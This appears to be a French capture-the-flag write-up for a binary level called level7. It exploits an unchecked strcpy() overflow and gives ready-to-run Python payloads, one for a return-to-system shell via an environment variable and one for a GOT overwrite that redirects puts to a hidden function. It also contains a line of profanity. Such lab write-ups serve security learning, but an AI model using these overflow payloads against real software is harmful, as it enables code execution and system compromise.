Le programme appelle un strcpy() sur un buffer non protege
On peut s'en servir pour overwrite son propre eip en passant l'adresse de l'eip dans la stack en src et l'adresse de system en src

Sur gdb, c'est assez simple, mais c'est plus complique en dehors parce qu'on a aucun moyen de voir les adresses
J'ai fait un script qui les essaies toutes, pour trouver la bonne adresse a overwrite
Le payload ressemble a ceci:

python -c "print 'O'*20 + '\xfc\xf9\xff\xbf ' + '\x60\xb0\xe6\xb7' + 'OSEF\x10\xff\xff\xbf'" > /tmp/7
env - PWD=$PWD COMMAND=$(python -c "print '/'*1024+'bin/sh'") /home/user/level7/level7 $(cat /tmp/7)

FILS DE PUTE


Sinon, on peut prendre la EASY WAY (je rigole mdr) et call la fonction m
On overwrite l'adresse de puts par l'adresse de m
L'adresse de puts a un 0 dedans donc on peut pas la mettre dans le payload
On disas puts: on voit un jump direct a 0x8049928
On essaye cette adresse

./level7 $(python -c "print 'O'*20 + '\x28\x99\x04\x08 ' + '\xf4\x84\x04\x08'")
